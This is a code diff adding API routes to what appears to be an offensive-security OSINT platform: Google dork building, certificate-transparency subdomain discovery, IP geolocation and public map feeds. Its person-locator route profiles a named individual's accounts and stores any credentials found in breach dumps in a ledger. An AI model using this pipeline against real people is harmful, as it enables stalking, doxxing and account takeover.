+      domain: typeof req.body?.domain === 'string' ? req.body.domain : undefined,
+      keyword: typeof req.body?.keyword === 'string' ? req.body.keyword : (typeof req.body?.name === 'string' ? req.body.name : typeof req.body?.domain === 'string' ? req.body.domain : undefined),
+      category: typeof req.body?.category === 'string' ? req.body.category : undefined,
+      operator: typeof req.body?.operator === 'string' ? req.body.operator : undefined,
+      limit: 80,
+    }).map((d: any) => ({ label: `DORK [${d.category}] ${d.label} (${d.operators.join(' ')})`, url: d.engines[0]?.url || `https://www.google.com/search?q=${encodeURIComponent(d.query)}`, query: d.query, category: d.category, severity: d.severity, operators: d.operators, engines: d.engines }));
+    const seen = new Set(dorks.map((x: any) => x.url));
+    const merged = [...dorks, ...g.filter((x: any) => !seen.has(x.url))];
+    res.json({ success: true, dorks: merged, count: merged.length, baseCount: dorks.length, dorkCount: g.length });
+  } catch {
+    res.json({ success: true, dorks, count: dorks.length });
+  }
+});
+
+// Google Dorks as a standalone OSINT search technique — operator fires in THEIR browser.
+app.all('/api/osint/google-dorks', (req: Request, res: Response) => {
+  const src: any = (req.method === 'GET' ? req.query : req.body) || {};
+  try {
+    // ?catalog=1 returns the raw template catalog + operators (for the UI cheat sheet).
+    if (String(src.catalog || '').toLowerCase() === '1' || String(src.catalog || '').toLowerCase() === 'true') {
+      res.json({ success: true, operators: googleDorkOperators(), catalog: googleDorkCatalog(), catalogCount: googleDorkCatalog().length });
+      return;
+    }
+    const dorks = buildGoogleDorks({
+      name: typeof src.name === 'string' ? src.name : undefined,
+      email: typeof src.email === 'string' ? src.email : undefined,
+      username: typeof src.username === 'string' ? src.username : undefined,
+      phone: typeof src.phone === 'string' ? src.phone : undefined,
+      domain: typeof src.domain === 'string' ? src.domain : undefined,
+      keyword: typeof src.keyword === 'string' ? src.keyword : undefined,
+      category: typeof src.category === 'string' ? src.category : undefined,
+      severity: typeof src.severity === 'string' ? src.severity : undefined,
+      operator: typeof src.operator === 'string' ? src.operator : undefined,
+      limit: typeof src.limit === 'string' ? parseInt(src.limit, 10) : typeof src.limit === 'number' ? src.limit : undefined,
+    });
+    res.json({ success: true, dorks, count: dorks.length, operators: googleDorkOperators().length });
+  } catch (err: any) {
+    res.status(400).json({ success: false, error: err?.message || String(err) });
+  }
+});
+
+/** The full person-locator chain — sweeps socials, Gravatar identity, breach/dump
+ *  lanes on every identifier, phone routing, and operator deep-links. Dossier
+ *  highlights are recorded to the findings ledger; dump credentials to the
+ *  credentials ledger so the Evidence Vault picks everything up. */
+app.post('/api/osint/locate', async (req: Request, res: Response): Promise<void> => {
+  const subject = typeof req.body?.subject === 'string' ? req.body.subject.trim() : '';
+  const name = typeof req.body?.name === 'string' ? req.body.name.trim() : undefined;
+  if (!subject && !name) { res.status(400).json({ error: 'subject required (email, @handle, phone, URL, domain, or name)' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] person locate: ${subject || name}`);
+    // Live per-module progress over SSE so the OSINT panel can glow the module
+    // currently in use (run phase=start → glow, phase=end → final state).
+    const dossier = await locatePerson({
+      subject: subject || undefined,
+      name,
+      onModule: (m) => {
+        try { broadcastEvent('osint:module', { subject: subject || name || '', ...m, ts: Date.now() }); } catch { /* SSE optional */ }
+      },
+      // Optional LLM assist over mined pages — routed through the CONFIGURED
+      // backbone, which is the operator's LOCAL gemma4 when useLocal is on.
+      // Bounded (≤2 pages/query) and kept as unverified second-opinion data.
+      // The OSINT AI (search director + extraction assist) runs on the selected
+      // local Ollama model — same one the pretext lab and dropdown use.
+      llmChat: (() => {
+        const st = osintSettings() as { localHost?: string; localPort?: string; localPath?: string; localModel?: string };
+        const model = st.localModel || process.env.TEMPEST_LOCAL_MODEL || '';
+        if (!model) return undefined;
+        const ep = resolveOllamaEndpoint(st);
+        return async (system: string, user: string) => {
+          const { content } = await ollamaChat(model, system, user.slice(0, 4000), ep);
+          return content;
+        };
+      })(),
+      llmModel: (osintSettings() as { localModel?: string }).localModel || process.env.TEMPEST_LOCAL_MODEL || undefined,
+    });
+    if (dossier.socialAccounts.length > 0) {
+      upsertMissionFindingToLedger({
+        title: `OSINT Dossier — ${dossier.subject} (${dossier.socialAccounts.length} accounts found)`,
+        description: `Presence ${dossier.presenceScore}/100.\n${dossier.socialAccounts.map((h) => `[${h.confidence}] ${h.site}: ${h.url}`).join('\n')}${dossier.identities.length ? '\n' + dossier.identities.map((i) => `${i.source}: ${i.detail}`).join('\n') : ''}`,
+        severity: dossier.socialAccounts.length >= 5 ? 'medium' : 'info',
+        targetId: dossier.subject,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `locator ran ${dossier.durationMs}ms; identifiers: ${Object.entries(dossier.parsed).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`).join(' ')}`, timestamp: Date.now(), metadata: { tool: 'osint_person_locate' } }],
+      });
+    }
+    for (const lane of dossier.dumpLanes) {
+      for (const cred of lane.credentials) {
+        recordCredentialToLedger({
+          type: cred.type,
+          username: cred.username,
+          secret: cred.secret,
+          domain: cred.domain,
+          source: cred.source,
+          notes: cred.notes,
+          discoveredAt: new Date().toISOString(),
+        });
+      }
+      for (const f of lane.free) {
+        if (typeof f.found === 'number' && f.found > 0) {
+          upsertMissionFindingToLedger({
+            title: `Breach Exposure — ${lane.query} (${f.service})`,
+            description: `${f.found} exposed records${f.sources?.length ? ` from: ${f.sources.slice(0, 8).join(', ')}` : ''}${f.fields?.length ? `; fields: ${f.fields.join(', ')}` : ''}`,
+            severity: 'medium',
+            targetId: lane.query,
+            operatorId: 'osint-panel',
+            evidence: [{ type: 'log', content: `${f.service}: ${f.found}${f.sources?.length ? ` (${f.sources.join('; ')})` : ''}`, timestamp: Date.now(), metadata: { tool: 'osint_breach_lookup' } }],
+          });
+        }
+      }
+    }
+    res.json({ success: true, dossier });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/ip-geo', async (req: Request, res: Response): Promise<void> => {
+  const ips = Array.isArray(req.body?.ips)
+    ? req.body.ips.filter((i: unknown): i is string => typeof i === 'string')
+    : typeof req.body?.ip === 'string' ? [req.body.ip] : [];
+  if (ips.length === 0) { res.status(400).json({ error: 'ip or ips[] required' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] ip geolocation: ${ips.length} address(es)`);
+    const geo = await ipGeoMany(ips);
+    res.json({ success: true, geo });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/geocode', async (req: Request, res: Response): Promise<void> => {
+  const q = typeof req.body?.q === 'string' ? req.body.q : '';
+  if (!q) { res.status(400).json({ error: 'q required (place text)' }); return; }
+  const hit = await geocodeText(q);
+  res.json({ success: true, geocode: hit });
+});
+
+// --- Geo Intel Map feed — infrastructure geography, 60s cache ---
+// Egress/proxy exit + engagement target hosts (findings ledger) + DFIR incident
+// IOC/target infrastructure, geolocated through keyless public sources. This maps
+// ASSETS and ATTACK INFRASTRUCTURE — it is not and will not be a person-tracker.
+interface MapFeedCache { at: number; feed: { points: GeoPoint[]; generatedAt: number; note: string } }
+let mapFeedCache: MapFeedCache | null = null;
+
+app.get('/api/osint/map-feed', async (req: Request, res: Response): Promise<void> => {
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  if (mapFeedCache && !refresh && Date.now() - mapFeedCache.at < 60_000) {
+    res.json({ success: true, ...mapFeedCache.feed, cached: true });
+    return;
+  }
+  try {
+    const points: GeoPoint[] = [];
+
+    // Egress / proxy exit — where our own traffic leaves from
+    try {
+      const net = await checkIp(false);
+      const exitIp = net?.exit?.ip;
+      if (exitIp) {
+        const geo = await geoForHost(String(exitIp));
+        points.push({
+          kind: 'egress', key: `egress:${exitIp}`, label: `Egress exit ${exitIp}`,
+          detail: [geo.city, geo.region, geo.country].filter(Boolean).join(', ') || geo.note,
+          lat: geo.lat, lon: geo.lon, city: geo.city, region: geo.region, country: geo.country,
+          org: geo.org, geoNote: net?.leak ? '⚠ IP LEAK — exit equals real IP' : 'proxied exit',
+        });
+      }
+    } catch { /* egress check best-effort */ }
+
+    // Engagement targets — hosts actually on record in the findings ledger, with the
+    // same host-plausibility discipline as the target map (code tokens, binary names
+    // and doctrine-fiction domains like c2.evil.com are not infrastructure).
+    const TLD_ALLOW = new Set(['com','net','org','gov','io','ai','co','app','dev','xyz','info','biz','online','site','cloud','us','uk','de','fr','nl','ru','cn','jp','br','in','edu','mil','ca','au','nz','ch','se','no','dk','fi','es','it','pt','pl','cz','at','be','ie','il','hk','sg','me','tv','fm','gg','to','cc','sh','is','eu']);
+    const plausibleHost = (h: string): boolean => {
+      if (/^\d{1,3}(\.\d{1,3}){3}$/.test(h)) return true;
+      if (!/^[a-z0-9][a-z0-9.-]*\.[a-z]{2,}$/i.test(h) || h.length > 253 || /\.\./.test(h)) return false;
+      const tld = h.split('.').pop()!.toLowerCase();
+      if (!TLD_ALLOW.has(tld)) return false;
+      if (/(^|\.)(c2|cnc|commandcontrol|malware|evil|attacker|evilserver)\./i.test('.' + h)) return false;
+      return true;
+    };
+    const targetHosts = new Set<string>();
+    for (const f of findingsLedger.values()) {
+      const t = (f.target || '').trim();
+      if (!t) continue;
+      const host = t.replace(/^https?:\/\//, '').replace(/\/.*$/, '').replace(/:\d+$/, '');
+      if (host && host !== 'unknown' && !/^[0-9a-f]{8}-[0-9a-f]{4}/i.test(host) && plausibleHost(host)) targetHosts.add(host);
+    }
+    for (const host of [...targetHosts].slice(0, 15)) {
+      const geo = await geoForHost(host).catch(() => null);
+      if (!geo) continue;
+      points.push({
+        kind: 'target', key: `target:${host}`, label: `Target ${host}`,
+        detail: geo.privateLan ? 'private LAN asset' : [geo.city, geo.region, geo.country].filter(Boolean).join(', ') || geo.note,
+        lat: geo.lat, lon: geo.lon, city: geo.city, region: geo.region, country: geo.country, org: geo.org,
+        geoNote: geo.privateLan ? 'RFC1918 — lab/LAN scope, no public geolocation' : undefined,
+      });
+    }
+
+    // DFIR incident infrastructure — target hosts + IOCs under investigation
+    try {
+      const incidents = DFIRManager.listIncidents({});
+      const dfirHosts = new Set<string>();
+      for (const inc of incidents.slice(0, 20)) {
+        if (inc.targetHost) dfirHosts.add(String(inc.targetHost));
+        for (const ioc of (inc as { iocs?: Array<{ value?: string }> }).iocs || []) {
+          if (ioc?.value && /^\d+\.\d+\.\d+\.\d+$/.test(ioc.value)) dfirHosts.add(ioc.value);
+        }
+      }
+      for (const host of [...dfirHosts].slice(0, 10)) {
+        const geo = await geoForHost(host).catch(() => null);
+        if (!geo) continue;
+        points.push({
+          kind: 'dfir', key: `dfir:${host}`, label: `DFIR ${host}`,
+          detail: geo.privateLan ? 'internal asset under investigation' : [geo.city, geo.region, geo.country].filter(Boolean).join(', ') || geo.note,
+          lat: geo.lat, lon: geo.lon, city: geo.city, region: geo.region, country: geo.country, org: geo.org,
+        });
+      }
+    } catch { /* DFIR aggregation best-effort */ }
+
+    const feed = {
+      points: points.filter((p) => typeof p.lat === 'number' && typeof p.lon === 'number')
+        .concat(points.filter((p) => typeof p.lat !== 'number')),
+      generatedAt: Date.now(),
+      note: 'Infrastructure geography: egress, engagement targets, DFIR IOCs. City-level IP geolocation only — no device/telephony positioning.',
+    };
+    mapFeedCache = { at: Date.now(), feed };
+    res.json({ success: true, ...feed });
+  } catch (err: any) {
+    res.status(500).json({ error: err?.message || String(err) });
+  }
+});
+
+// --- Public GPS screen — keyless open-geodata feeds (vehicles/phenomena/places) ---
+// OpenSky ADS-B, USGS quakes, NOAA alerts, ISS, Nominatim reverse, Overpass POIs.
+// Maps public environment/vehicle broadcasts ONLY — no individual resolution, no
+// fusion-to-person, no telephony positioning. Person work stays in the OSINT Locator.
+
+app.get('/api/gps/aircraft', async (req: Request, res: Response): Promise<void> => {
+  const bbox = buildBbox(req.query.lamin, req.query.lomin, req.query.lamax, req.query.lomax);
+  if (!bbox) {
+    res.status(400).json({ error: 'bbox required: lamin,lomin,lamax,lomax (numeric, ≤10° span per axis)' });
+    return;
+  }
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const feed = await fetchAircraft(bbox, { refresh });
+  res.json({ success: true, bbox, ...feed });
+});
+
+app.get('/api/gps/quakes', async (req: Request, res: Response): Promise<void> => {
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const feed = await fetchEarthquakes({ refresh });
+  const bbox = buildBbox(req.query.lamin, req.query.lomin, req.query.lamax, req.query.lomax);
+  // `total` = the unfiltered 24h count, so an in-view 0 reads as "none near you,
+  // N worldwide — zoom out" instead of an indistinguishable dead layer.
+  res.json({ success: true, total: feed.points.length, ...(bbox ? { ...feed, points: feed.points.filter((p) => bboxOverlaps(bbox, p.lat, p.lon)) } : feed) });
+});
+
+app.get('/api/gps/alerts', async (req: Request, res: Response): Promise<void> => {
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const feed = await fetchWeatherAlerts({ refresh });
+  const bbox = buildBbox(req.query.lamin, req.query.lomin, req.query.lamax, req.query.lomax);
+  res.json({ success: true, total: feed.points.length, ...(bbox ? { ...feed, points: feed.points.filter((p) => bboxOverlaps(bbox, p.lat, p.lon)) } : feed) });
+});
+
+app.get('/api/gps/iss', async (req: Request, res: Response): Promise<void> => {
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  res.json({ success: true, ...(await fetchIss({ refresh })) });
+});
+
+app.get('/api/gps/reverse', async (req: Request, res: Response): Promise<void> => {
+  const lat = parseFloat(String(req.query.lat ?? ''));
+  const lon = parseFloat(String(req.query.lon ?? ''));
+  if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
+    res.status(400).json({ error: 'lat and lon required (numeric)' });
+    return;
+  }
+  const hit = await reverseGeocode(lat, lon);
+  res.json({ success: true, pin: hit ? { lat, lon, ...hit } : { lat, lon, label: null } });
+});
+
+app.get('/api/gps/poi', async (req: Request, res: Response): Promise<void> => {
+  const lat = parseFloat(String(req.query.lat ?? ''));
+  const lon = parseFloat(String(req.query.lon ?? ''));
+  const radius = parseFloat(String(req.query.radius ?? '500'));
+  const kind = req.query.kind;
+  if (!Number.isFinite(lat) || !Number.isFinite(lon)) {
+    res.status(400).json({ error: 'lat and lon required (numeric)' });
+    return;
+  }
+  if (!isPoiKind(kind)) {
+    res.status(400).json({ error: `kind must be one of: ${POI_KINDS.join(', ')}` });
+    return;
+  }
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const feed = await fetchPois(lat, lon, Number.isFinite(radius) ? radius : 500, kind, { refresh });
+  res.json({ success: true, ...feed });
+});
+
+// Cell-tower SITES (OpenCelliD, key-gated) — antenna registry positions only,
+// no device association. Same honest key-required note pattern as the dump lanes.
+app.get('/api/gps/towers', async (req: Request, res: Response): Promise<void> => {
+  const bbox = buildBbox(req.query.lamin, req.query.lomin, req.query.lamax, req.query.lomax);
+  if (!bbox) {
+    res.status(400).json({ error: 'bbox required: lamin,lomin,lamax,lomax (numeric, ≤10° span per axis)' });
+    return;
+  }
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const feed = await fetchCellTowers(bbox, { refresh });
+  res.json({ success: true, bbox, ...feed });
+});
+
+app.get('/api/gps/satellites/groups', (_req: Request, res: Response): void => {
+  res.json({ success: true, groups: SAT_GROUPS.map((g) => ({ id: g, label: SAT_GROUP_LABELS[g] || g })) });
+});
+
+app.get('/api/gps/satellites', async (req: Request, res: Response): Promise<void> => {
+  const rawGroup = String(req.query.group || 'visual');
+  const group = isSatGroup(rawGroup) ? rawGroup : null;
+  if (!group) {
+    res.status(400).json({ error: `unknown group '${rawGroup}' — use /api/gps/satellites/groups`, groups: SAT_GROUPS.slice() });
+    return;
+  }
+  const rawLimit = parseInt(String(req.query.limit || '200'), 10);
+  const limit = Number.isFinite(rawLimit) ? Math.max(1, Math.min(500, rawLimit)) : 200;
+  const refresh = /^(1|true|yes)$/i.test(String(req.query.refresh || ''));
+  const bbox = buildBbox(req.query.lamin, req.query.lomin, req.query.lamax, req.query.lomax);
+  const feed = await fetchSatellites({ group, limit, refresh });
+  const points = bbox ? feed.points.filter((p) => bboxOverlaps(bbox, p.lat, p.lon)) : feed.points;
+  res.json({ success: true, group, limit, bbox: bbox || undefined, ...feed, points });
+});
+
+// --- GPS copilot — the local model narrates the map, the server owns the math ---
+// POST /api/gps/copilot { prompt, mode?, view?, model?, baseUrl?, apiKey? }
+// The browser's Settings → Local Model values are honored (same trust rules as
+// /api/llm/local: a client-chosen baseUrl never receives the server's key).
+// All distances, bearings and counts are computed server-side from the same
+// cached feeds the map renders; the model only picks whitelisted map actions and
+// writes the prose. Unparseable replies degrade to prose, never to a bad action.
+
+app.get('/api/gps/copilot', (_req: Request, res: Response): void => {
+  let model = '';
+  let configured = true;
+  try {
+    const cfg = config.getLLMConfig('local');
+    model = cfg.model || '';
+    configured = Boolean(cfg.baseUrl);
+  } catch {
+    configured = false;
+  }
+  res.json({ success: true, provider: 'local', model, configured, localOnly: true, fallback: 'none — a down local model reports down, it never escalates to a cloud provider', actions: COPILOT_ACTIONS });
+});
+
+app.post('/api/gps/copilot', async (req: Request, res: Response): Promise<void> => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  const prompt = typeof body.prompt === 'string' ? body.prompt.trim().slice(0, 2000) : '';
+  if (!prompt) { res.status(400).json({ error: 'prompt required — tell the copilot what you need' }); return; }
+  const modeRaw = String(body.mode || 'auto');
+  const mode: CopilotMode = modeRaw === 'brief' || modeRaw === 'command' || modeRaw === 'ask' ? modeRaw : 'auto';
+
+  const bu = sanitizeLocalBaseUrl(body.baseUrl);
+  if (!bu.ok) { res.status(400).json({ error: bu.error }); return; }
+
+  const v = (body.view || {}) as Record<string, unknown>;
+  const num = (x: unknown) => (typeof x === 'number' && Number.isFinite(x) ? x : null);
+  const view = {
+    bbox: buildBbox(v.lamin, v.lomin, v.lamax, v.lomax),
+    center: num(v.centerLat) !== null && num(v.centerLon) !== null ? { lat: num(v.centerLat)!, lon: num(v.centerLon)! } : null,
+    zoom: num(v.zoom),
+    pin: num(v.pinLat) !== null && num(v.pinLon) !== null ? { lat: num(v.pinLat)!, lon: num(v.pinLon)! } : null,
+    pinLabel: typeof v.pinLabel === 'string' ? v.pinLabel.slice(0, 200) : null,
+    layers: Array.isArray(v.layers) ? v.layers.filter((x): x is string => typeof x === 'string').slice(0, 12) : null,
+    satellites: v.satellites && typeof v.satellites === 'object' ? v.satellites as { group?: string; count?: number } : null,
+    pois: v.pois && typeof v.pois === 'object' ? v.pois as { kind?: string; count?: number } : null,
+    towers: num(v.towers),
+  };
+
+  try {
+    // Reuse the live feed caches (45s aircraft / 120s quakes+alerts / 15s ISS);
+    // the copilot narrates the SAME data the map is showing, not a second pull.
+    const [aircraft, quakes, alerts, iss] = await Promise.all([
+      view.bbox ? fetchAircraft(view.bbox) : Promise.resolve(null),
+      fetchEarthquakes(),
+      fetchWeatherAlerts(),
+      fetchIss(),
+    ]);
+    const ctx = buildCopilotContext(view, { aircraft, quakes, alerts, iss });
+
+    const base = config.getLLMConfig('local', typeof body.model === 'string' && body.model ? body.model : undefined);
+    const clientApiKey = typeof body.apiKey === 'string' && body.apiKey.trim() ? body.apiKey.trim() : '';
+    const effectiveApiKey = bu.value ? (clientApiKey || undefined) : (clientApiKey || base.apiKey);
+    const timeoutMs = Math.max(30_000, Math.min(600_000, Number(body.timeout) > 0 ? Number(body.timeout) : 180_000));
+    const llmConfig = {
+      ...base,
+      provider: 'local' as const,
+      model: typeof body.model === 'string' && body.model ? body.model : base.model,
+      baseUrl: bu.value || base.baseUrl,
+      apiKey: effectiveApiKey,
+      maxTokens: 900,
+      temperature: 0.2,
+      timeout: timeoutMs,
+      // LOCAL ONLY. LLMBackbone's ladder appends config.fallbackChain, and
+      // TEMPEST_MODEL_FALLBACK=1 puts OpenRouter on it — so a copilot run with
+      // the local backend down would silently answer from a paid cloud model
+      // and ship the map context off-box. The panel promises "nothing leaves the
+      // box"; an empty chain is what makes that promise true.
+      fallbackChain: [] as never[],
+    };
+
+    const controller = new AbortController();
+    const onClose = () => { if (!res.writableEnded) controller.abort(); };
+    res.on('close', onClose);
+    let reply: string;
+    let usage: unknown;
+    let modelUsed = llmConfig.model;
+    try {
+      console.log(`[T3MP3ST][GPS] copilot ${mode}: ${prompt.slice(0, 80)} (${ctx.facts.length} facts)`);
+      const backbone = new LLMBackbone(llmConfig as any);
+      const result = await backbone.chat([
+        { role: 'system', content: buildCopilotSystemPrompt(ctx, mode) },
+        { role: 'user', content: buildCopilotUserPrompt(prompt) },
+      ] as any, { maxTokens: llmConfig.maxTokens, temperature: llmConfig.temperature, signal: controller.signal });
+      reply = result.content || '';
+      usage = result.usage;
+      modelUsed = result.model || modelUsed;
+    } finally {
+      res.off('close', onClose);
+    }
+
+    const plan = resolveCopilotPlan(parseCopilotReply(reply), {
+      pin: ctx.pins,
+      iss: ctx.issFix,
+      center: ctx.view.center,
+      pinLabel: ctx.view.pinLabel || undefined,
+    });
+    res.json({
+      success: true,
+      mode,
+      model: modelUsed,
+      say: plan.say,
+      actions: plan.actions,
+      parseFailed: plan.parseFailed,
+      raw: plan.parseFailed ? reply.slice(0, 2000) : undefined,
+      usage,
+      facts: ctx.facts,
+      notes: ctx.notes,
+    });
+  } catch (error: any) {
+    const message = error?.message || String(error);
+    console.error('[T3MP3ST][GPS] copilot failed:', message);
+    if (res.headersSent) return;
+    // A local model that is down is an ordinary operator state, not a server bug:
+    // 502 with the reason so the panel can show it and keep the map working.
+    res.status(502).json({ error: `local model unavailable — ${message}`.slice(0, 400), actions: [] });
+  }
+});
+
+// --- AREA WATCH — "what's the news where the pin landed" (keyless RSS + local LLM) ---
+// POST /api/gps/area-brief { lat, lon, place, address?, model?, baseUrl?, apiKey?, timeout? }
+// The server fetches real indexed coverage for the pin's PLACE (Google News RSS
+// primary, Bing News RSS secondary), folds in the seismic/weather events already
+// near that point, and lets the LOCAL model summarize — grounded only on those
+// headlines. No headlines means no model call at all: a local CPU model must not
+// burn 90s to be told there is nothing.
+
+app.post('/api/gps/area-brief', async (req: Request, res: Response): Promise<void> => {
+  const body = (req.body || {}) as Record<string, unknown>;
+  const lat = typeof body.lat === 'number' ? body.lat : parseFloat(String(body.lat ?? ''));
+  const lon = typeof body.lon === 'number' ? body.lon : parseFloat(String(body.lon ?? ''));
+  const place = typeof body.place === 'string' ? body.place.trim().slice(0, 160) : '';
+  if (!Number.isFinite(lat) || !Number.isFinite(lon) || Math.abs(lat) > 90 || Math.abs(lon) > 180) {
+    res.status(400).json({ error: 'lat and lon required (numeric, in range)' });
+    return;
+  }
+  if (!place) {
+    res.status(400).json({ error: 'place required — the news search runs on a named place, not a bare coordinate' });
+    return;
+  }
+  const address = (body.address && typeof body.address === 'object' ? body.address : null) as Record<string, string> | null;
+
+  try {
+    const news = await fetchAreaNews(place, address, { refresh: /^(1|true|yes)$/i.test(String(body.refresh || '')) });
+
+    // Seismic/weather context for the same point, from the feeds the map already
+    // caches — "nearest quake to this pin" is part of "what's happening here".
+    const [quakes, alerts] = await Promise.all([fetchEarthquakes(), fetchWeatherAlerts()]);
+    const nearQuake = quakes.points
+      .map((p) => ({ p, km: haversineKm({ lat, lon }, { lat: p.lat, lon: p.lon }) }))
+      .filter((x) => x.km <= 200)
+      .sort((a, b) => (b.p.mag ?? -99) - (a.p.mag ?? -99))[0];
+    const nearAlert = alerts.points
+      .map((p) => ({ p, km: haversineKm({ lat, lon }, { lat: p.lat, lon: p.lon }) }))
+      .filter((x) => x.km <= 200)
+      .sort((a, b) => a.km - b.km)[0];
+
+    const facts: string[] = [
+      `Place: ${place} (${lat.toFixed(4)}, ${lon.toFixed(4)}).`,
+      `News search query used: ${news.query || '(none)'}. Sources queried: ${news.sourcesTried.join(', ') || 'none'}.`,
+      `Indexed articles in the last 24h mentioning this place: ${news.articles.length}.`,
+    ];
+    // NOTE: push, never `...(cond ? 'a' : 'b')` — spreading a STRING yields one
+    // array element per character (the first live run sent the model a fact list
+    // shredded into 600+ single-character lines).
+    facts.push(nearQuake
+      ? `Nearest/strongest quake within 200 km: M${(nearQuake.p.mag ?? 0).toFixed(1)} "${nearQuake.p.label}", ${Math.round(nearQuake.km)} km away.`
+      : 'No earthquake epicentres within 200 km of this point in the past 24h.');
+    facts.push(nearAlert
+      ? `Nearest active weather alert polygon centroid: ${Math.round(nearAlert.km)} km — "${nearAlert.p.label}".`
+      : 'No active weather alerts with a centroid within 200 km of this point.');
+
+    // Nothing indexed and nothing seismic nearby → answer without the model.
+    if (!news.articles.length) {
+      res.json({
+        success: true,
+        place,
+        query: news.query,
+        articles: [],
+        brief: null,
+        skipped: true,
+        reason: news.note || 'no indexed coverage for this place in the last 24h',
+        facts,
+        notes: news.note ? [news.note] : [],
+      });
+      return;
+    }
+
+    const bu = sanitizeLocalBaseUrl(body.baseUrl);
+    if (!bu.ok) { res.status(400).json({ error: bu.error }); return; }
+    const base = config.getLLMConfig('local', typeof body.model === 'string' && body.model ? body.model : undefined);
+    const clientApiKey = typeof body.apiKey === 'string' && body.apiKey.trim() ? body.apiKey.trim() : '';
+    const effectiveApiKey = bu.value ? (clientApiKey || undefined) : (clientApiKey || base.apiKey);
+    const timeoutMs = Math.max(30_000, Math.min(600_000, Number(body.timeout) > 0 ? Number(body.timeout) : 240_000));
+
+    const system = [
+      'You are the AREA WATCH analyst for a public-data map. The operator dropped a pin and wants to know what is going on there right now.',
+      '',
+      'ABSOLUTE RULES:',
+      '- Every claim must come from the ARTICLE LIST or the LOCAL EVENTS below. They are fetched from live news indexes; you did not browse and you cannot browse.',
+      '- Headlines are headlines, not verified reports of fact. Attribute claims to the outlet and never assert that something definitely happened.',
+      '- If the headlines are thin, thin local sports, or mostly national news that merely mentions the place, say that plainly — that is a useful answer.',
+      '- Do not infer anything about individuals. No tracking, no profiling, no "who lives there" reasoning.',
+      '- Output ONLY the brief text: 2-4 short sentences, plain text, no markdown headers, no bullet characters, no preamble.',
+    ].join('\n');
+    const user = [
+      `PLACE: ${place} (${lat.toFixed(4)}, ${lon.toFixed(4)})`,
+      '',
+      'ARTICLE LIST (newest first, title | outlet | age):',
+      ...newsFactLines(news, 18),
+      '',
+      'LOCAL EVENTS (computed from live seismic/weather feeds):',
+      ...facts.slice(3),
+      '',
+      'Write the 2-4 sentence area brief now.',
+    ].join('\n');
+
+    const controller = new AbortController();
+    const onClose = () => { if (!res.writableEnded) controller.abort(); };
+    res.on('close', onClose);
+    let reply = '';
+    let modelUsed = base.model;
+    let usage: unknown;
+    let briefError: string | null = null;
+    try {
+      console.log(`[T3MP3ST][GPS] area brief: ${place} (${news.articles.length} articles)`);
+      const backbone = new LLMBackbone({
+        ...base,
+        provider: 'local' as const,
+        model: typeof body.model === 'string' && body.model ? body.model : base.model,
+        baseUrl: bu.value || base.baseUrl,
+        apiKey: effectiveApiKey,
+        maxTokens: 500,
+        temperature: 0.3,
+        timeout: timeoutMs,
+        fallbackChain: [] as never[], // local only — never escalate a pin drop to a paid cloud model
+      } as any);
+      const result = await backbone.chat(
+        [{ role: 'system', content: system }, { role: 'user', content: user }] as any,
+        // noThink: a short grounded summary must not be eaten by a <think> block
+        // (measured: gemma4 spent the whole budget thinking and returned nothing).
+        { maxTokens: 500, temperature: 0.3, signal: controller.signal, noThink: true }
+      );
+      reply = result.content || '';
+      usage = result.usage;
+      modelUsed = result.model || modelUsed;
+    } catch (e: any) {
+      // The headlines are the deliverable; the summary is a bonus. A down local
+      // model must not take the news with it.
+      briefError = (e?.message || String(e)).slice(0, 200);
+      console.error('[T3MP3ST][GPS] area brief: model failed, returning headlines only —', briefError);
+    } finally {
+      res.off('close', onClose);
+    }
+
+    res.json({
+      success: true,
+      place,
+      query: news.query,
+      articles: news.articles,
+      brief: reply.trim() || null,
+      briefError: reply.trim() ? null : briefError,
+      skipped: false,
+      model: modelUsed,
+      usage,
+      facts,
+      notes: news.note && news.note !== 'cached' ? [news.note] : [],
+    });
+  } catch (error: any) {
+    const message = error?.message || String(error);
+    console.error('[T3MP3ST][GPS] area brief failed:', message);
+    if (res.headersSent) return;
+    res.status(502).json({ error: `area brief failed — ${message}`.slice(0, 400) });
+  }
+});
+
+// --- Dark web direct — leak-site monitor + onion search/fetch (keyless lanes) ---
+
+// --- OSINT infrastructure: domain / IP / certificate / routing intelligence.
+// Keyless and read-only throughout. Every lane reports its own outcome, and a
+// blocked source lands in `failed[]` so it can never be mistaken for a clean one.
+app.post('/api/osint/infra/domain', async (req: Request, res: Response): Promise<void> => {
+  const t = classifyTarget(String(req.body?.domain ?? ''));
+  if (t.kind !== 'domain') { res.status(400).json({ error: t.note ?? 'not a domain' }); return; }
+  console.log(`[T3MP3ST][OSINT] domain infrastructure: ${t.value}`);
+  const result = await domainInfraScan(t.value);
+  const subdomains = result.crt.data?.subdomains ?? [];
+  for (const sub of subdomains.slice(0, 50)) {
+    upsertMissionFindingToLedger({
+      title: `Subdomain Discovered (CT) — ${sub}`,
+      description: `Certificate Transparency log entry for ${sub} under ${result.domain}. Discovered via crt.sh.`,
+      severity: 'info',
+      targetId: result.domain,
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `crt.sh CT entry → ${sub}`, timestamp: Date.now(), metadata: { tool: 'osint_domain_infra' } }],
+    });
+  }
+  res.json({ success: true, result });
+});
+
+app.post('/api/osint/infra/ip', async (req: Request, res: Response): Promise<void> => {
+  const t = classifyTarget(String(req.body?.ip ?? ''));
+  if (t.kind !== 'ipv4') { res.status(400).json({ error: t.note ?? 'not a public IPv4 address' }); return; }
+  console.log(`[T3MP3ST][OSINT] IP infrastructure: ${t.value}`);
